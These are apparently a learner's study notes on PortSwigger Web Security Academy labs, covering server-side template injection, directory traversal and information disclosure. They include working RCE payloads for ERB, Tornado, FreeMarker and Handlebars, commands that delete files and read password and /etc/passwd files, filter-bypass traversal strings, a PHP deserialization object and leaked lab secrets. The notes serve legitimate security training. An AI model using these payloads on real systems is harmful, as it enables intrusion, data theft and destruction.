# [Portswigger](#portswigger)
  - [SQL Injection](#sql-injection)
  - [Cross-site Scripting](#cross-site-scripting)
  - [Cross-site request forgery](#csrf)
  - [Clickjacking](#clickjacking)
  - [DOM based vulnerabilities](#dom-based-vulnerabilities)
  - [Cross-origin resource sharing](#CORS)
  - [XML external entity (XXE) injection](#xxe-injection)
  - [Server-side request forgery](#ssrf)
  - [HTTP request smuggling](#HTTP-request-smuggling)
  - [OS command injection](#OS-command-injection)
  - [Server-side template injection](#ssti)
  - [Directory traversal](#directory-traversal)
  - [Access control vulnerabilities](#Access-control-vulnerabilities)
  - [Authentication](#authentication)
  - [Websockets](#websockets)
  - [Web cache poisoning](#Web-cache-poisoningn)
  - [Insecure deserialization](#Insecure-deserialization)
  - [Information disclosure](#Information-disclosure)
  - [Business logic vulnerabilities](#Business-logic-vulnerabilities)
  - [HTTP Host header attacks](#HTTP-Host-header-attacks)
  - [OAuth authentication](#OAuth-authentication)

## SQL Injection

## Cross Site Scripting

## CSRF

## Clickjacking

## DOM based vulnerabilities

## CORS

## XXE Injection

## SSRF

## HTTP request smuggling

## OS command injection

## SSTI

### SSTI - Server Side Template Injection 



* Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
* Template engines are designed to generate web pages by combining fixed templates with volatile data
* SSTI can occur when user input is concatenated directly into a template, rather than passed in as data.
*  server-side template injection payloads are delivered and evaluated server-side, potentially making them much more dangerous than a typical client-side template injection.



#### IMPACT =>



* SSTI can expose websites to a variety of attacks depending on the template engine in question and how exactly the application uses it.
* At Server side, attacker can achieve -> RCE [Remote Code Execution] -> Taking full control of the back-end server and can use to perform other attacks on Internal Infrastructure
* Can  read access to sensitive data and arbitrary files on the server, even not having RCE can do this type of things



#### NOTE ->



* Static templates that simply provide placeholders into which dynamic content is rendered are generally not vulnerable to server-side template injection

* as templates are simply strings, web developers sometimes directly concatenate user input into templates prior to rendering

* Not Vulnerable -> because the user's first name is merely passed into the template as data.

  * $output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );

* Vulnerable -> instead of a static value being passed into the template, part of the template itself is being dynamically generated using the `GET` parameter `name`

  * ```
    $output = $twig->render("Dear " . $_GET['name']);
    ```

* ```
  http://vulnerable-website.com/?name={{bad-stuff-here}}
  ```



* some websites deliberately allow certain privileged users, such as content editors, to edit or submit custom templates by design. 
  * This clearly poses a huge security risk if an attacker is able to compromise an account with such privileges.





### Constructing a server-side template injection attack =>



![Server-side template injection methodology](https://portswigger.net/web-security/images/ssti-methodology-diagram.png)



#### Detect ->



*  Simplest approach is ->  Fuzzing the templates by injecting a sequence of special characters commonly used in template expressions
  * ${{<%[%'"}}%\
* If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. 
* Server-side template injection vulnerabilities occur in two distinct contexts, each of which requires its own detection method.



#### 	1 Plaintext Context =>





* Most template languages allow you to freely input content either by using HTML tags directly or by using the template's native syntax, which will be rendered to HTML on the back-end before the HTTP response is sent. 
* ${7*7}
* If the resulting output contains `Hello 49`, this shows that the mathematical operation is being evaluated server-side



#### 	2 Code context =>



* In other cases, the vulnerability is exposed by user input being placed within a template expression

* This may take the form of a user-controllable variable name being placed inside a parameter, such as:

  * greeting = getQueryParameter('greeting')

  * ```
    engine.render("Hello {{"+greeting+"}}", data)
    ```

    ```
    http://vulnerable-website.com/?greeting=data.username
    ```

* One method of testing for server-side template injection in this context is to first establish that the parameter doesn't contain a direct XSS vulnerability by injecting arbitrary HTML into the value:

  * ```
    http://vulnerable-website.com/?greeting=data.username<tag>
    ```

* In the absence of XSS, this will usually either result in a blank entry in the output (just `Hello` with no username), encoded tags, or an error message.

* The next step is to try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it:

  * ```
    http://vulnerable-website.com/?greeting=data.username}}<tag>
    ```

* If this again results in an error or blank output, you have either used syntax from the wrong templating language or, if no template-style syntax appears to be valid, server-side template injection is not possible.

* Alternatively, if the output is rendered correctly, along with the arbitrary HTML, this is a key indication that a server-side template injection vulnerability is present:







#### Identify =>



* Once you have detected the template injection potential, the next step is to identify the template engine.
* Many Templating Languages use  similar syntax that is specifically chosen not to clash with HTML characters
* it can be relatively simple to create probing payloads to test which template engine is being used.
* Simply submitting invalid syntax is often enough because the resulting error message will tell you exactly what the template engine is, and sometimes even which version
* We need to manually test different language-specific payloads and study how they are interpreted by the template engine. 
* Using a process of elimination based on which syntax appears to be valid or invalid, you can narrow down the options quicker than you might think
* A common way of doing this is to inject arbitrary mathematical operations using syntax from different template engines.



![Template decision tree](https://portswigger.net/web-security/images/template-decision-tree.png)



* the same payload can sometimes return a successful response in more than one template language.
*  the payload `{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2. Therefore, it is important not to jump to conclusions based on a single successful response.



#### Exploit

* After confirm about vulnerability then just exploit it.



=============================================================================



### <= LABS Practice Notes =>



#### 1. Basic server-side template injection =>



* This lab using ERB Tempaltes

* Documentation for ERB Templates =>

  * https://puppet.com/docs/puppet/5.5/lang_template_erb.html#:~:text=An%20ERB%20template%20looks%20like,to%20control%20the%20templates'%20output.
  * https://puppet.com/docs/puppet/6.17/lang_template_erb.html
  * https://www.rubyguides.com/2018/11/ruby-erb-haml-slim/

* General Syntax => 

  * <%= %>

* When I click on Product 1 , It show me this =>

  * /?message=Unfortunately%20this%20product%20is%20out%20of%20stock

* But with Product 2, it show me Product 2 Details

* So, lets try Inject Product 1

* 1st I tried this as Detect => ${{<%[%'"}}%\

  * Result =>

  * <div> ${{[%'"}}%\ </div>

  * that above enclose in <div> element tag

* Now tried this -> <%=7*7%> => Result gave 49 under div element tag, so its mean Vulnerable

* By using ***"self.methods"***  =>

  * [:inspect, :to_s, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :instance_variables, :method, :public_method, :singleton_method, :define_singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :<=>, :===, :=~, :!~, :eql?, :respond_to?, :freeze, :object_id, :send, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :itself, :yield_self, :taint, :tainted?, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :protected_methods, :singleton_methods, :public_methods, :private_methods, :!, :equal?, :instance_eval, :==, :instance_exec, :!=, :__send__, :__id__]

* Now, lets run system commands => <%=system("whoami")%> 

  * Result -> carlos

* Now check pwd and then ls ->

  * <%=system("ls%20-la")%>
  * Result =>
  * total 32
    drwxr-xr-x 2 carlos carlos 4096 Nov  1 08:14 .
    drwxr-xr-x 6 root   root   4096 Jun 24 10:23 ..
    -rw-r--r-- 1 carlos carlos  119 Nov  1 08:14 .bash_history
    -rw-r--r-- 1 carlos carlos  220 Apr  4  2018 .bash_logout
    -rw-r--r-- 1 carlos carlos 3771 Apr  4  2018 .bashrc
    -rw-r--r-- 1 carlos carlos  807 Apr  4  2018 .profile
    -rw-r--r-- 1 carlos carlos 6816 Nov  1 08:14 morale.txt

* Now just delete that morale.txt file




Reference => https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection





#### 2. Basic server-side template injection (code context) =>



* This lab using -> Tornado template. Lets read about it

* Documentation -> https://www.tornadoweb.org/en/stable/template.html

* Basic usage looks like:

  ```
  t = template.Template("<html>{{ myvalue }}</html>")
  print(t.generate(myvalue="XXX"))
  ```

* Syntax Reference =>

  * {{ ... }}
  * Also -> {% %}
  * Comment  out section syntax -> {# ... #}
  * To include a literal `{{`, `{%`, or `{#` in the output, escape them as `{{!`, `{%!`, and `{#!`, respectively.

* Now, 1st detect this vulnerability in this lab

* After Login -> My Account -> Preferred Name  Functionality

* It seems this is our injection point

* POST Request -> /my-account/change-blog-post-author-display

  * blog-post-author-display=user.name&csrf=7xKEVtRQcJgc7bFwLOu4KBkb9FV4Aet8

* blog-post-author-display=user.name <--- this is our injection point might be

* I checked blog post and there is comment section too

* I tried -> { 7*7 } and got result ->

  * Internal Server Error

    No handlers could be found for logger "tornado.application" Traceback (most recent call last):  File "<string>", line 15, in <module>  File "/usr/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__    "exec", dont_inherit=True)  File "<string>.generated.py", line 4    _tt_tmp = user.first_name{{ "7*7  # <string>:1                             ^ SyntaxError: invalid syntax

* I checked burp history and POST Request of comment -> %7B+7*7+%7D

* From error i got to know that i need to fix my command by balance it -> user.first_name{{ "7*7 #

* Mean i need to do this -> }}{{7*7}}

* So in POST Request -> /my-account/change-blog-post-author-display

  * I put my payload there }}{{7*7}

  * And when i check blog post comment i saw ->

  * Peter49}} | 01 November 2020                        

    { 7*7 }

* Mean it works

* user.first_name}}{%25+import+os+%25}{{+os.popen("whoami").read()+}}

* This above payload give result -> Petercarlos

* `user.first_name}}{%25+import+os+%25}{{+os.popen("rm+morale.txt").read()+}}`




Reference => https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/





#### 3. Server-side template injection using documentation =>



* In this lab, we need to find what template engine the target is using and solve by reading documentation and referneces

* I checked products and visitd Product id=1 and there at bottom saw -> "Edit Template"

* By clicking on it it goes to -> product/template?productId=1

* <p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>

  This above code using

* ${} <- this expression -> ES6 Template

* I tried this -> 

  ```
  `${7*7}`
  ```

* And got result 49 

* great

* Then i used -> Dir.entries('/')

* Saw this -> FreeMarker template error (DEBUG mode; use RETHROW in production!):

* Perfect , so this is FreeMarker Template

* Now i used this command ->

  * ```
    <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
    
    Result => uid=2002(carlos) gid=2002(carlos) groups=2002(carlos) 
    ```

* Done by removing morale.txt



References =>

`https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker`

`https://css-tricks.com/template-literals/`

`https://developers.google.com/web/updates/2015/01/ES6-Template-Strings`

`https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection`



#### 4. Server-side template injection in an unknown language with a documented exploit =>



* Again need to find which template engine using

* Product 1 -> Unfortunately this product is out of stock -> ?message=Unfortunately this product is out of stock

* Product 2 -> Working Fine

* So, testing experiment on Product 1

* When using simple payload -> {{7*7}} -> Error came ->

  * /usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267
                throw new Error(str);
                ^

* From resources got this is -> Handlebars (NodeJS)  Template Engine

* This is the code ->

  * ```
    wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
    
    
    URL Decoded =>
    
    wrtz{{#with "s" as |string|}}
      {{#with "e"}}
        {{#with split as |conslist|}}
          {{this.pop}}
          {{this.push (lookup string.sub "constructor")}}
          {{this.pop}}
          {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
            {{this.pop}}
            {{#each conslist}}
              {{#with (string.sub.apply 0 codelist)}}
                {{this}}
              {{/with}}
            {{/each}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}
    
    ```

* 



References =>

`https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection`

`http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html`





#### 5.  Server-side template injection with information disclosure via user-supplied objects =>



Note -> `websites will contain both built-in objects provided by the template and custom, site-specific objects that have been supplied by the web developer`

`need to study an object's behavior in the context of each distinct template before you find a way to exploit it.`

`can still leverage server-side template injection vulnerabilities for other high-severity exploits, such as [directory traversal](https://portswigger.net/web-security/file-path-traversal), to gain access to sensitive data.`



* From exploring this lab, saw products having  "Edit Template" Functionality

* Got they have -> Hurry! Only {{product.stock}} left of {{product.name}} at {{product.price}}

* I tried this -> aakash{{7*7}} -> Got error ->

  * ```
    
    
    Internal Server Error
    
    Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '*7' from '7*7' 
    ```

* Mean they are using Django Template

* Now use -> 

  ```
  {{settings.SECRET_KEY}}
  
  Got -> 8ywunoxxgy43ti34ys906tpcyn3wko77
  ```

* 



References =>

`https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection`





#### 6. Server-side template injection in a sandboxed environment =>



* Freemarker template engine

* When i tried execution payloads i got ->

  * `Execute is not allowed in the template for security reasons`
  * `Can't use ?api, because the "api_builtin_enabled" configuration setting is false`

* I used this payload ->

  * ```
    `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join("%20")}`
    
    Got -> 104 119 53 119 51 51 117 55 98 118 114 115 48 117 100 121 108 51 105 103
    
    This is decimal
    
    use decimal to ascii convert -> hw5w33u7bvrs0udyl3ig
    ```

    

* 



References =>

`https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html`

`https://programmersought.com/article/32251827867/`

`https://ackcent.com/in-depth-freemarker-template-injection/`

`https://freemarker.apache.org/docs/api/freemarker/template/Template.html`





#### 7. Server-side template injection with a custom exploit =>



* After login i checked my account -> 2 Functionalities using -> Upload avatar and Prefered Name

* I changed preferred name to first name and uploaded random image 

* From image uploading got this ->

  * 

    ```
    PHP Fatal error:  Uncaught Exception: Error in file upload: 1 in /home/carlos/avatar_upload.php:6
    Stack trace:
    #0 {main}
      thrown in /home/carlos/avatar_upload.php on line 6
    ```



* Then i uploaded second good image but same error



* Also from blog post i saw comment section and use payload there

* I tried some payloads in comment section but not good result

* Then i tried payload in /my-account/change-blog-post-author-display post request of this parameter -> blog-post-author-display=user.first_name${{<%[%'"}}%\&csrf=2KMTFwczZgchz6sa2z8luFodAVMJetJG

* Then checked comment section of blog but got this error ->

  * ``` 
    ​```Internal Server Error
    
    PHP Fatal error:  Uncaught  Twig_Error_Syntax: Unexpected character "$" in "index" at line 1. in  /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Lexer.php:270 Stack trace: #0  /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Lexer.php(202): Twig_Lexer->lexExpression() #1  /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Lexer.php(105): Twig_Lexer->lexVar() #2  /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(512): Twig_Lexer->tokenize(Object(Twig_Source)) #3  /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(565): Twig_Environment->tokenize(Object(Twig_Source)) #4  /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(368): Twig_Environment->compileSource(Object(Twig_Source)) #5  /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php(289): Twig_Environment->loadTemplate('index') #6 Command line code(10): Twig_Environment->render('index', Array) #7 {main}  thrown in  /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Lexer.php on  line 270
    ```

* Wow, so this template is TWIG

* By analyzing the error and response i played with payloads and finally this payload work and balanced the query -> }}${{7*'7'

* Result -> Peter$49

* I tried eveyrything but failed and getting error

* Then i remind there is image functionality too

* Try that parameter too

* While uploading image i tried this payload -> user.setAvatar('/etc/passwd')

* Got this result ->

  * ```
    PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/octet-stream in /home/carlos/User.php:28
    Stack trace:
    #0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/anything.t...', 'application/oct...')
    #1 {main}
      thrown in /home/carlos/User.php on line 28
    ```

* mime type ->  set /image/jpg -> user.setAvatar('/etc/passwd','image/jpg')

* Failed again

* Then i tried payload in comment section and checked -> avatar?avatar=wiener

* It opened a file with desire result

* This time i used payload -> }}${{user.setAvatar('/home/carlos/User.php','image/jpg')

* Got desire result

* user.first_name}}${{user.gdprDelete()

* From Portswigger ->

* ```
  In the PHP file, Notice that you have access to the gdprDelete() function, which deletes the user's avatar. You can combine this knowledge to delete Carlos's file.
  First set the target file as your avatar, then view the comment to execute the template:
  user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
  Invoke the user.gdprDelete() method and view your comment again to solve the lab.
  ```

## Directory traversal

### Directory traversal
- Directory traversal (also known as file **path traversal**) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.

### Reading arbitrary files via directory traversal
#### Unix-based operating systems
- An attacker can request the following URL to retrieve an arbitrary file from the server's filesystem: 
  - `https://insecure-website.com/loadImage?filename=../../../etc/passwd` 
-  This causes the application to read from the following file path:
   - `/var/www/images/../../../etc/passwd`

#### Windows
-  On Windows, both `../` and `..\` are valid directory traversal sequences, and an equivalent attack to retrieve a standard operating system file would be: 
   - `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini` 

### Common obstacles to exploiting file path traversal vulnerabilities
-  If an application strips or blocks directory traversal sequences from the user-supplied filename, then it might be possible to bypass the defense using a variety of techniques. 

#### Case 1
-  You might be able to use an **absolute path from the filesystem root**, such as `filename=/etc/passwd`, to directly reference a file without using any traversal sequences.

#### Case 2
- You might be able to use **nested traversal sequences**, such as `....//` or `....\/`, which will revert to simple traversal sequences when the inner sequence is stripped. 

#### Case 3 
- You might be able to use various **non-standard encodings**, such as `..%c0%af` or `..%252f`, to bypass the input filter. 

#### Case 4
- If an application requires that the **user-supplied filename must start with the expected base folder**, such as `/var/www/images`, then it might be possible to include the required base folder followed by suitable traversal sequences. 
- For example
  - `filename=/var/www/images/../../../etc/passwd` 

#### Case 5
-  If an application requires that the user-supplied filename must end with an expected file extension, such as .png, then it might be possible to **use a null byte** to effectively terminate the file path before the required extension. 
- For example: 
  - `filename=../../../etc/passwd%00.png`

### How to prevent a directory traversal attack
- The most effective way to prevent file path traversal vulnerabilities is to **avoid passing user-supplied input to filesystem APIs altogether**.
- If it is considered unavoidable to pass user-supplied input to filesystem APIs, then two layers of defense should be used together to prevent attacks: 
  - The application should **validate the user input before processing it**. Ideally, the validation should compare against a whitelist of permitted values. If that isn't possible for the required functionality, then the validation should verify that the input contains only permitted content, such as purely alphanumeric characters. 
  - After validating the supplied input, the application should append the input to the base directory and use a platform filesystem API to canonicalize the path. It should verify that the canonicalized path starts with the expected base directory.


## Access control vulnerabilities

## Authentication

## WebSockets

## Web cache poisoning

## Insecure deserialization

## Information disclosure

#### About Information Disclosure =>

* also known as information leakage, a website unintentionally reveals sensitive information to its users
* Information Like  => Data about other Users , such as Username or financial information
* Information Like=>Sensitive commercial or business data
* Information Like => Technical details about the website ad its infrastructure
* Can lead to other vulnerabilities

#### Examples ==> 

* Revealing the names of hidden directories, their structure, and their contents via a robots.txt file or directory listing
* Providing access to source code files via temporary backups
* Explicitly mentioning database table or column names in error messages
* Unnecessarily exposing highly sensitive information, such as credit card details
* Hard-coding API keys, IP addresses, database credentials, and so on in the source code
* Hinting at the existence or absence of resources, usernames, and so on via subtle differences in application behavior

#### Developer make mistake like =>

* Fail to remove internal content from public
* Insecure configuration use by default
* Make flawed design and behvior of application


NOTE : Our main focus on the IMPACT & Exploitability of the leaked information


### Testing for Information Disclosure =>

```Sensitive data can be leaked in all kinds of places, so it is important not to miss anything that could be useful later. ```


#### 1. Fuzzing  & Burp Scanner  & Burp's Engagement Tool =>

* If got Interesting Parameter -> Try to submit Unexpected data types there and FUZZ that parameter with lots of Payloads -> And then Observer behavior of Target i.e. Unusual Response
* One error can be useful for another thing, so keep an eye on this
* Tool use -> Burp  Intruder
* Check carefully -> HTTP status codes, response times, lengths, and so on.
* Use grep matching rules to quickly identify occurrences of keywords, such as error, invalid, SELECT, SQL, and so on.
* Apply grep extraction rules to extract and compare the content of interesting items within responses.
* Useful Extension -> Logger++
* Burp Scanner -> will alert you if it finds sensitive information such as private keys, email addresses, and credit card numbers in a response
* also identify any backup files, directory listings, and so on
* can access the engagement tools from the context menu - just right-click on any HTTP message, Burp Proxy entry, or item in the site map and go to "Engagement tools".
* Important Burp Tool -> Search, Find Comments, Discover Contents


#### 2.  Engineering informative responses =>

* Verbose error messages can sometimes disclose interesting information while you go about your normal testing workflow
*  submitting an invalid parameter value might lead to a stack trace or debug response that contains interesting details. 
*  We can sometimes cause error messages to disclose the value of our desired data in the response.


### Common Sources of Information Disclosure =>

* Files for Web Crawlers -> robots.txt , sitemap.xml

*  Directory Listings i.e leaking the existance and location of sensitive resource to public

*  Developer Comments -> developer often forget to remove sensitive comments from html page or even in JS

*  Verbose Error Messages ->
	* most common causes of information disclosure 
	* pay attention to all error messages while auditing or testing target 
	* It might expose : name a template engine, database type, or server that the website is using, along with its version number etc 
	* Check for source code
	* Useful for -> SQLi, Username Enumeration etc


* Debugging data -> 
	* During Devleopment phase Developer debug data to check for error message and logs (which contain large amounts of information about application's behavior)
	* Good in during Development phase But not good if Devleoper expose this things to public Accidently or forgot to remove this information while making target live from development phase
	* Valuable Information from Debugging Data include ->
		* Values for key session variables that can be manipulated via user input
		* Hostnames and credentials for back-end components
		* File and directory names on the server
		* Keys used to encrypt data transmitted via the client
	* Debugging information may sometimes be logged in a separate file.
	* Goal of an attacker is to obtain this file


*  User account pages ->
	* User's Profile page or "My Account" page usually contain -> sensitive Information -> like email address, phone number, API key and so on
	* **Business Logic Flaws**  vulnerability on such Application's Functions can lead to Information Leakage and hence can be use for Account Takeover
	* By **Business Logic Flaws** Attacker can view other user's data
	* So, keep an eye on such Functionalities , like -> GET /user/personal-info?user=carlos


* Source code disclosure via backup files ->
	* Source code contains often Sensitive data
	* Example -> API keys and credentials for accessing back-end components.
	* Sometime, we can see a backup file present on web server
	* To get this just try this -> filename.php to -> filename.php~ [ that is use tilde ~]
	* Also to try -> .bak extra


* Information disclosure due to insecure configuration ->
	* Websites are sometimes vulnerable as a result of improper configuration
	* commonly due to the widespread use of third-party technologies, whose vast array of configuration options are not necessarily well-understood by those implementing them. 
	* Also, developers might forget to disable various debugging options in the production environment
	* Example ->  
		* HTTP TRACE method is designed for diagnostic purposes.
		* If enable. the web server will respond to requests that use the TRACE method by echoing in the response the exact request that was received. 
		* This behavior leads to information disclosure, such as the name of internal authentication headers that may be appended to requests by reverse proxies.


* Version control history ->
	* Check for .git directory
	* Try various ways to get or enumerate on .git directory for juicy information
	* Check website's version control history of .git
	* This may include logs containing committed changes and other interesting information.


============================================================================

### Lab Solution =>

#### 1. Unprotected admin functionality with unpredictable URL =>

* Check target page , source page, and check JS, it disclose the URL of admin panel => /admin-u4shhr
* Just go to that admin panel and do what ever we want


#### 2.   Information disclosure in error messages =>

* Here just normal browse target and check parameters what given to users
* When testing for parameters just give unwanted things to that parameter like -> id=2" or id=unwanted-things and this will expose version of server use on page as Error


#### 3. Information disclosure on debug page =>

* Just check view source and there check for comments for debug purpose or even ctrl+f for either comments or debug -> like -> ```<!--  or "debug"```
* got -> ```<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->```


#### 4.  User ID controlled by request parameter with data leakage in redirect =>

* Here just need to change id of user on GET Parameter of "My Account" page and if misconfigure then we can access other user data 
* Here the target redirect when trying to view other user by changing user to victim name
* But still the sensitive data can be accessible on the body of a web page


#### 5. Arbitrary object injection in PHP =>

* This lab use -> serialization-based session mechanism
* From view-source -> check comment -> got -> /libs/CustomTemplate.php
* just change this file to -> /libs/CustomTemplate.php~
* We can see php source code, now just analyze it and do further attack accordingly
* PHP Code using -> CustomTemplate class and contains the **__destruct() magic method**
* This will invoke the unlink() method on the lock_file_path attribute, which will delete the file on this path
* Use Burp Decoder and use correct Syntax for Serialized PHP Data to create a CustomTemplate object with the lock_file_path attribute set to /home/carlos/morale.txt.
* O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
* Base64 and URL-encode this object and save it to your clipboard
* Send a request containing the session cookie to Burp Repeater.
* In Burp Repeater, replace the session cookie with the modified one in your clipboard.
* Send the request. **The __destruct() magic method is automatically invoked and will delete Carlos's file.**


Myself Note: though i solved this above lab but i still not understand this Seriliazed based injection


#### 6. Source code disclosure via backup files =>

* From robots.txt -> got /backup dir
* Got from that dir -> /backup/ProductTemplate.java.bak
* This contain source code of java file and there we can see DB Password 


#### 7.  Authentication bypass via information disclosure =>

* Go to /admin directory -> available to user only
* So, change the GET Header to TRACE header to /admin page
* In Response -> X-Custom-IP-Authorization header came -> Contain our IP Address -> which is used to determine whether or not the request came from the localhost IP address.
* From Burp -> Proxy --> Match and Replace -> Click "Add"  -> Leave the match condition blank -> in Replace Field  enter : X-Custom-IP-Authorization: 127.0.0.1
* Burp Proxy will now add this header to every request we send.
* Now, we can go to home page, and we can see admin panel accessable and do whatever we want


#### 8. Information disclosure in version control history =>

* Just try to enter .git on the browser of target
* We can download this repo and check for juicy information there
* There is a commit -> Remove admin password from config
* Use diff command  for the changed admin.conf file
* We can see admin password with an environment variable ADMIN_PASSWORD instead
* Use that password as administrator and do whatever we want


==========================================================================

#### Summary =>

* Just focus on everything the target can disclose about sensitive information from various ways like ->
* forced browsing, 
* verbose error message, 
* debug enable, 
* directory showing, 
* comment useful on source view, 
* backup file, 
* ~ [tilde] ,
*  try to input unusual data and even try every character which can be response from target as useful for attackers
*  .git directory
*  Other HTTP Header Method -> TRACE

## Business logic vulnerabilities

#### About Business Logic Vulnerability

* flaws in the design and implementation of an application that allow an attacker to elicit unintended behavior.
* "business logic" simply refers to the set of rules that define how the application operates.
* also known as "application logic vulnerabilities" or simply "logic flaws".
* are often invisible to people who aren't explicitly looking for them as they typically won't be exposed by normal use of the application. 
* an attacker may be able to exploit behavioral quirks by interacting with the application in ways that developers never intended.
* main purposes of business logic is to enforce the rules and constraints that were defined when designing the application or functionality. 
* the business rules dictate how the application should react when a given scenario occurs.
* includes preventing users from doing things that will have a negative impact on the business or that simply don't make sense.
* By passing unexpected values into server-side logic, an attacker can potentially induce the application to do something that it isn't supposed to.
* Business logic vulnerabilities often arise because the design and development teams make flawed assumptions about how users will interact with the application.
* Impact - Flaws in Authentication mechanism is great Impact on security
* Goal - Exploit Privilege Escalation or bypass Authentication entirely, gaining access to sensitive data and functionality
* Flawed logic in financial transactions can obviously lead to massive losses for the business through stolen funds, fraud, and so on.


### Prevention ->

* Make sure developers and testers understand the domain that the application serves
* Avoid making implicit assumptions about user behavior or the behavior of other parts of the application
* Maintain clear design documents and data flows for all transactions and workflows, noting any assumptions that are made at each stage.
* Write code as clearly as possible, Don't make it complex -> Complex mean surely flaw in code
* Note any references to other code that uses each component.


### Examples of Business Logic Vulns =>

#### 1.  Excessive trust in client-side controls =>

* Client side validation is wrong assumption by developer, attacker can bypass using proxy like Burp
* Accepting data at face value, without performing proper integrity checks and server-side validation, can allow an attacker to do all kinds of damage with relatively minimal effort.


#### 2. Failing to handle unconventional input =>

* aim of the application logic is to restrict user input to values that adhere to the business rules.
* Example -> application may be designed to accept arbitrary values of a certain data type, but the logic determines whether or not this value is acceptable from the perspective of the business
* Attacker's Goal is to do opposite to Business Logic applying on those Input Values
* Like -> 
	* Application logic imply rule to input -> id=1 , only numeric value allow
